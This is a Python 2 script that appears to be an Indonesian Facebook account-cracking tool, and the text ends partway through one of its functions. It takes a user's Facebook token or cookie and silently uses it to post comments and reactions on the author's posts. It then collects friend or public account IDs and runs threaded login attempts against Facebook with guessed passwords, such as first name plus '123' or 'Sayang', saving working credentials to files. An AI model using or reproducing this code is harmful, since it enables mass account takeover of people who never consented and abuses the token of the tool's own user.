#!/usr/bin/python2
 # coding=utf-8


'''
DECRYPT BY MAHMUD AZIM (MR. ERROR)
'''


import os,re,sys,itertools,time,requests,random,threading,json,random
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
reload(sys)
sys.setdefaultencoding('utf8')

#### LOADING ####
os.system('clear')
done = False
def animate():
    for c in itertools.cycle(['\033[0;96m|', '\033[0;92m/', '\033[0;95m-', '\033[0;91m\\']):
        if done:
            break
        sys.stdout.write('\r\033[0;93mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

### KELUAR ###
def keluar():
	print ("! Exit")
	os.sys.exit()
	
### JALAN ###
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
### LOGO ###
logo = ("""\033[0;91m _____ _      ____                _            ____
|  ___| |__  / ___|_ __ __ _  ___| | _____ _ _|___ \

| |_  | '_ \| |   | '__/ _` |/ __| |/ / _ \ '__|__) |
\033[0;97m|  _| | |_) | |___| | | (_| | (__|   <  __/ |  / __/
|_|   |_.__/ \____|_|  \__,_|\___|_|\_\___|_| |_____
\033[0;93m──────────────────────────────────────────────────────
\033[0;95m{\033[0;96m×\033[0;95m} \033[0;93mAuthor   \033[0;91m: \033[0;96mMuhammad Rizky
\033[0;95m{\033[0;96m×\033[0;95m} \033[0;93mGithub   \033[0;91m: \033[0;96mGithub.com/RIZKY4/cr4ck
\033[0;95m{\033[0;96m×\033[0;95m} \033[0;93mFacebook \033[0;91m: \033[0;96mFacebook.com/Rizky.Rasata""")

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
fbid = []

##### MASUK #####
def masuk():
	os.system('clear')
	print logo
	print 52* ('\033[0;93m─');time.sleep(0.07)
	print ('\033[0;92m1.\033[0;97m Login Via Token Facebook');time.sleep(0.07)
	print ('\033[0;92m2.\033[0;97m Login Via Cookie Facebook');time.sleep(0.07)
	print ('\033[0;92m3.\033[0;97m Ambil Token Dari Link');time.sleep(0.07)
	print ('\033[0;91m0.\033[0;97m Keluar');time.sleep(0.07)
	print 52* ('\033[0;93m─');time.sleep(0.07)
	pilih_masuk()

#### PILIH MASUK ####
def pilih_masuk():
	msuk = raw_input('\033[0;92m>\033[0;97m ')
	if msuk =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_masuk()
	elif msuk =="1":
		login_token()
	elif msuk =="2":
		login_cookie()
	elif msuk =="3":
		ambil_link()
	elif msuk =="0":
		keluar()
	else:
		print"\033[0;91m! Isi Yg Benar"
		pilih_masuk()
			
#### LOGIN_TOKEN ####
def login_token():
	os.system('clear')
	print logo
	print 50* '\033[0;93m─'
	toket = raw_input("\033[0;95m•\033[0;97m Token \033[0;91m:\033[0;92m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;92m√ Login Berhasil'
		os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
		bot_komen()
	except KeyError:
		print '\033[1;91m! Token salah '
		time.sleep(1.7)
		masuk()
	except requests.exceptions.SSLError:
		print '! Koneksi Bermasalah'
		exit()
		
#### LOGIN COOKIES ####
def login_cookie():
	os.system('clear')
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	try:
		cookie = raw_input("\033[0;95m•\033[0;97m Cookie \033[0;91m:\033[0;92m ")
		data = {
		            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
			        'referer' : 'https://m.facebook.com/',
			        'host' : 'm.facebook.com',
			        'origin' : 'https://m.facebook.com',
			        'upgrade-insecure-requests' : '1',
			        'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			        'cache-control' : 'max-age=0',
			        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			        'content-type' : 'text/html; charset=utf-8',
			         'cookie' : cookie }
		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
		cari = re.search('(EAAA\w+)', coki.text)
		hasil = cari.group(1)
		zedd = open("login.txt", 'w')
		zedd.write(hasil)
		zedd.close()
		print '\033[0;92m√ Login Berhasil'
		time.sleep(2)
		bot_komen()
	except AttributeError:
		print '\033[0;91m! Cookie Salah'
		time.sleep(2)
		masuk()
	except UnboundLocalError:
		print '\033[0;91m! Cookie Salah'
		time.sleep(2)
		masuk()
	except requests.exceptions.SSLError:
		os.system('clear')
		print '\033[0;91m! Koneksi Bermasalah'
		exit()

##### AMBIL LINK #####
def ambil_link():
	os.system("clear")
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	jalan("\033[0;92mDilarang Menggunakan Akun Facebook Lama...")
	jalan("\033[0;92mWajib Menggunakan Akun Facebook Baru ...")
	os.system ("cd ... && npm install")
	jalan ("\033[0;96mMulai...")
	os.system ("cd ... && npm start")
	raw_input("\n[ Kembali ]")
	masuk()

#### BOT KOMEN ####
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	kom = ('Gw Pake Sc Lu Bang 😘')
	reac = ('ANGRY')
	post = ('937777953338365')
	post2 = ('938954086554085')
	kom2 = ('Mantap Bang 😁')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

#### MENU ####
def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print '\033[0;91m! Token Invalid '
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print '\033[0;91m ! Token invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print '\033[0;91m! Tidak ada koneksi'
		keluar()
	os.system("clear")
	print (logo);time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	jalan ("\033[0;96m•\033[0;95m WELCOME\033[0;90m =>\033[0;92m " +nama);time.sleep(0.07)
	jalan ("\033[0;96m•\033[0;95m USER ID\033[0;90m =>\033[0;92m " +id);time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[0;95m1.\033[0;97m Crack ID Dari Teman/Publik');time.sleep(0.07)
	print ('\033[0;95m2.\033[0;97m Crack ID Dari Like Teman/Publik');time.sleep(0.07)
	print ('\033[0;95m3.\033[0;97m Crack ID Dari Followers');time.sleep(0.07)
	print ('\033[0;95m4.\033[0;97m Cari ID Menggunakan Username');time.sleep(0.07)
	print ('\033[0;95m5.\033[0;97m Lihat Hasil Crack');time.sleep(0.07)
	print ('\033[0;95m6.\033[0;97m Perbarui Script');time.sleep(0.07)
	print ('\033[0;91m0.\033[0;97m Keluar Akun');time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	pilih_menu()
	
### PILIH MENU ###
def pilih_menu():
	peler = raw_input('\033[0;95m>\033[0;97m ')
	if peler =="":
		print '\033[0;91m ! Isi Yg Benar'
		pilih_menu()
	elif peler == "1":
		crack_teman()
	elif peler == "2":
		crack_like()
	elif peler == "3":
		crack_follow()
	elif peler == "4":
		cari_id()
	elif peler == "5":
		hasil_crack()
	elif peler == "6":
		perbarui()
	elif peler == "0":
		print '\033[0;91mMenghaspus Token ...'
		time.sleep(1)
		os.system('rm -rf login.txt')
		keluar()
	else:
		print '\033[0;91m ! Isi Yg Benar'
		pilih_menu()
		
##### CRACK TEMAN/PUBLIK #####
def crack_teman():
	os.system("clear")
	print (logo);time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[0;93m1.\033[0;97m Crack ID Indonesia');time.sleep(0.07)
	print ('\033[0;93m2.\033[0;97m Crack ID Bangladesh');time.sleep(0.07)
	print ('\033[0;93m3.\033[0;97m Crack ID Pakistan');time.sleep(0.07)
	print ('\033[0;93m4.\033[0;97m Crack ID Usa');time.sleep(0.07)
	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	pilih_teman()
	
### PILIH TEMAN ###
def pilih_teman():
	uki = raw_input('\033[0;93m>\033[0;97m ')
	if uki =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_teman()
	elif uki == "1":
		crack_indo()
	elif uki == "2":
		crack_bangla()
	elif uki == "3":
		crack_pakis()
	elif uki == "4":
		crack_usa()
	elif uki == "0":
		menu()
	else:
		print '\033[0;91m! Isi Yg Benar'
		pilih_teman()

##### CRACK INDONESIA #####
def crack_indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;91m! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[0;96m1.\033[0;97m Crack Dari Daftar Teman');time.sleep(0.07)
	print ('\033[0;96m2.\033[0;97m Crack Dari Publik/Teman');time.sleep(0.07)
	print ('\033[0;96m3.\033[0;97m Crack Dari File');time.sleep(0.07)
	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input('\033[0;96m>\033[0;97m ')
	if teak =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_indo()
	elif teak =="1":
		os.system('clear')
		print logo
		print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2":
		os.system('clear')
		print logo
		print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		idt = raw_input("\033[0;91m• \033[0;96mID Publik/Teman \033[0;91m:\033[0;92m ");time.sleep(0.07)
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;91m•\033[0;96m Nama \033[0;91m:\033[0;92m "+sp["name"]
		except KeyError:
			print "\033[0;91m! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m< \033[0;96mKembali \033[0;97m>")
			crack_indo()
		except requests.exceptions.ConnectionError:
			print '\033[0;91m! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
			idlist = raw_input('\033[0;91m• \033[0;96mNama File\033[0;91m :\033[0;92m ');time.sleep(0.07)
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[0;91mFile tidak ada ! '
			raw_input('\033[0;97m<\033[0;96m Kembali\033[0;97m >')
		except IOError:
			print '\033[0;91mFile tidak ada !'
			raw_input("\n\033[0;97m< \033[0;96mKembali \033[0;97m>")
			crack_indo()
	elif teak =="0" or teak =="00":
		crack_teman()
	else:
		print '\033[0;91m! Isi Yg Benar'
		pilih_indo()
	
	print '\033[0;91m• \033[0;96mJumlah ID\033[0;91m :\033[0;92m '+str(len(id));time.sleep(0.07)
	print ('\033[0;91m• \033[0;96mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;91m• \033[0;96mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n\033[0;91m• \033[0;96mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !");time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	
### MAIN INDONESIA ###
	def main(arg):
		global cekpoint,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pw = v['first_name']+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw
				oke = open('done/indo.txt', 'a')
				oke.write('\n[Berhasil] '+em+' ∆ '+pw)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;96m[Cekpoint]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw
					cek = open('done/indo.txt', 'a')
					cek.write('\n[Cekpoint] '+em+' ∆ '+pw)
					cek.close()
					cekpoint.append(em)
				else:
					pw2 = v['first_name']+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw2
						oke = open('done/indo.txt', 'a')
						oke.write('\n[Berhasil] '+em+' ∆ '+pw2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;96m[Cekpoint]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw2
							cek = open('done/indo.txt', 'a')
							cek.write('\n[Cekpoint] '+em+' ∆ '+pw2)
							cek.close()
							cekpoint.append(em)
						else:
							pw3 = v['first_name']+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw3
								oke = open('done/indo.txt', 'a')
								oke.write('\n[Berhasil] '+em+' ∆ '+pw3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;96m[Cekpoint]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw3
									cek = open('done/indo.txt', 'a')
									cek.write('\n[Cekpoint] '+em+' ∆ '+pw3)
									cek.close()
									cekpoint.append(em)
								else:
									pw4 = 'Sayang'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw4
										oke = open('done/indo.txt', 'a')
										oke.write('\n[Berhasil] '+em+' ∆ '+pw4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;96m[Cekpoint]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw4
											cek = open('done/indo.txt', 'a')
											cek.write('\n[Cekpoint] '+em+' ∆ '+pw4)
											cek.close()
											cekpoint.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print '\033[0;91m• \033[0;96mSelesai ...'
	print"\033[0;91m• \033[0;96mTotal \033[0;92mOK\033[0;97m/\x1b[0;96mCP \033[0;97m: \033[0;92m"+str(len(oks))+"\033[0;97m/\033[0;96m"+str(len(cekpoint))
	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;96mCP \033[0;96mfile tersimpan \033[0;91m: \033[0;92mdone/indo.txt'
	print 50* "\033[0;93m─"
	raw_input("\033[0;97m< \033[0;96mKembali\033[0;97m >")
	os.system("python2 crack-2.py")
	
#### CRACK BANGLADESH ####
def crack_bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;91m! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[0;94m1.\033[0;97m Crack Dari Daftar Teman');time.sleep(0.07)
	print ('\033[0;94m2.\033[0;97m Crack Dari Publik/Teman');time.sleep(0.07)
	print ('\033[0;94m3.\033[0;97m Crack Dari File');time.sleep(0.07)
	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	pilih_bangla()

### PILIH BANGLADESH ###
def pilih_bangla():
	teak = raw_input('\033[0;94m>\033[0;97m ')
	if teak =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_bangla()
	elif teak =="1":
		os.system('clear')
		print logo
		print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2":
		os.system('clear')
		print logo
		print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		idt = raw_input("\033[0;91m• \033[0;94mID Publik/Teman \033[0;91m:\033[0;92m ");time.sleep(0.07)
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;91m•\033[0;94m Nama \033[0;91m:\033[0;92m "+sp["name"]
		except KeyError:
			print "\033[0;91m! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m< \033[0;94mKembali \033[0;97m>")
			crack_bangla()
		except requests.exceptions.ConnectionError:
			print '\033[0;91m! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
			idlist = raw_input('\033[0;91m• \033[0;94mNama File\033[0;91m :\033[0;92m ');time.sleep(0.07)
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[0;91mFile tidak ada ! '
			raw_input('\033[0;97m<\033[0;94m Kembali\033[0;97m >')
		except IOError:
			print '\033[0;91mFile tidak ada !'
			raw_input("\n\033[0;97m< \033[0;94mKembali \033[0;97m>")
			crack_bangla()
	elif teak =="0" or teak =="00":
		crack_teman()
	else:
		print '\033[0;91m! Isi Yg Benar'
		pilih_bangla()
	
	print '\033[0;91m• \033[0;94mJumlah ID\033[0;91m :\033[0;92m '+str(len(id));time.sleep(0.07)
	print ('\033[0;91m• \033[0;94mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;91m• \033[0;94mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n\033[0;91m• \033[0;94mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !");time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	
### MAIN BANGLADESH ###
	def main(arg):
		global cekpoint,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pz = v['first_name']+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz
				oke = open('done/bangla.txt', 'a')
				oke.write('\n[Berhasil] '+em+' ∆ '+pz)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;94m[Cekpoint]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz
					cek = open('done/bangla.txt', 'a')
					cek.write('\n[Cekpoint] '+em+' ∆ '+pz)
					cek.close()
					cekpoint.append(em)
				else:
					pz2 = v['first_name']+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz2
						oke = open('done/bangla.txt', 'a')
						oke.write('\n[Berhasil] '+em+' ∆ '+pz2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;94m[Cekpoint]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz2
							cek = open('done/bangla.txt', 'a')
							cek.write('\n[Cekpoint] '+em+' ∆ '+pz2)
							cek.close()
							cekpoint.append(em)
						else:
							pz3 = v['first_name']+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz3
								oke = open('done/bangla.txt', 'a')
								oke.write('\n[Berhasil] '+em+' ∆ '+pz3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;94m[Cekpoint]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz3
									cek = open('done/bangla.txt', 'a')
									cek.write('\n[Cekpoint] '+em+' ∆ '+pz3)
									cek.close()
									cekpoint.append(em)
								else:
									pz4 = '786786'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz4
										oke = open('done/bangla.txt', 'a')
										oke.write('\n[Berhasil] '+em+' ∆ '+pz4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;94m[Cekpoint]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz4
											cek = open('done/bangla.txt', 'a')
											cek.write('\n[Cekpoint] '+em+' ∆ '+pz4)
											cek.close()
											cekpoint.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print '\033[0;91m• \033[0;94mSelesai ...'
	print"\033[0;91m• \033[0;94mTotal \033[0;92mOK\033[0;97m/\x1b[0;94mCP \033[0;97m: \033[0;92m"+str(len(oks))+"\033[0;97m/\033[0;94m"+str(len(cekpoint))
	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;94mCP \033[0;94mfile tersimpan \033[0;91m: \033[0;92mdone/bangla.txt'
	print 50* "\033[0;93m─"
	raw_input("\033[0;97m< \033[0;94mKembali\033[0;97m >")
	os.system("python2 crack-2.py")
	
#### CRACK PAKISTAN ####
def crack_pakis():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;91m! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	print ('\033[0;90m1.\033[0;97m Crack Dari Daftar Teman');time.sleep(0.07)
	print ('\033[0;90m2.\033[0;97m Crack Dari Publik/Teman');time.sleep(0.07)
	print ('\033[0;90m3.\033[0;97m Crack Dari File');time.sleep(0.07)
	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	pilih_pakis()

### PILIH PAKISTAN ###
def pilih_pakis():
	teak = raw_input('\033[0;90m>\033[0;97m ')
	if teak =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_pakis()
	elif teak =="1":
		os.system('clear')
		print logo
		print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2":
		os.system('clear')
		print logo
		print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
		idt = raw_input("\033[0;91m• \033[0;90mID Publik/Teman \033[0;91m:\033[0;92m ");time.sleep(0.07)
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;91m•\033[0;90m Nama \033[0;91m:\033[0;92m "+sp["name"]
		except KeyError:
			print "\033[0;91m! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m< \033[0;90mKembali \033[0;97m>")
			crack_pakis()
		except requests.exceptions.ConnectionError:
			print '\033[0;91m! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print ("\033[0;93m────────────────────────────────────────────────────");time.sleep(0.07)
			idlist = raw_input('\033[0;91m• \033[0;90mNama File\033[0;91m :\033[0;92m ');time.sleep(0.07)
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[0;91mFile tidak ada ! '
			raw_input('\033[0;97m<\033[0;90m Kembali\033[0;97m >')
		except IOError:
			print '\033[0;91mFile tidak ada !'
			raw_input("\n\033[0;97m< \033[0;90mKembali \033[0;97m>")
			crack_pakis()
	elif teak =="0" or teak =="00":
		crack_teman()
	else:
		print '\033[0;91m! Isi Yg Benar'
		pilih_pakis()
	
	print '\033[0;91m• \033[0;90mJumlah ID\033[0;91m :\033[0;92m '+str(len(id));time.sleep(0.07)
	print ('\033[0;91m• \033[0;90mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;91m• \033[0;90mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n\033[0;91m• \033[0;90mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !");time.sleep(0.07)
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	
### MAIN PAKISTAN ###
	def main(art):
		global cekpoint,oks
		ef = art
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			ah = requests.get('https://graph.facebook.com/'+ef+'/?access_token='+toket)
			p = json.loads(ah.text)
			pb = 'Pakistan'
			rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xs = rep.content
			if 'mbasic_logout_button' in xs or 'save-device' in xs:
				print '\033[0;92m[Berhasil]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb
				oke = open('done/pakis.txt', 'a')
				oke.write('\n[Berhasil] '+ef+' ∆ '+pb)
				oke.close()
				oks.append(ef)
			else :
				if 'checkpoint' in xs:
					print '\033[0;90m[Cekpoint]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb
					cek = open('done/pakis.txt', 'a')
					cek.write('\n[Cekpoint] '+ef+' ∆ '+pb)
					cek.close()
					cekpoint.append(ef)
				else:
